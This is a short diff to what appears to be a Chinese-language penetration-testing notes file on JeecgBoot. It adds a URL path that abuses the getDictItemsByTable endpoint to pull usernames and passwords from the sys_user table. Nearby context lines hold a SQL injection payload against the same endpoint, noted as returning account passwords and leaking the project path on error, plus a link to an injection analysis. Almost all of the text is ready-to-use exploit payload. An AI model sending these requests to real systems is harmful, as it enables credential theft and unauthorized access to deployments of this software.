@@ -131,6 +131,7 @@ OSS存储数据列表：
 getDictItemsByTable注入分析：<https://xz.aliyun.com/t/13186?time__1311=GqmhkD8iGNDKKYK0%3DeG%3Dt0QqitoQymmD>
 ```
 sql注入账号密码查询。若报错可报项目路径
+/sys/ng-alain/getDictItemsByTable/sys_user/username/password
 /jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js
 
 sys_third_app_config
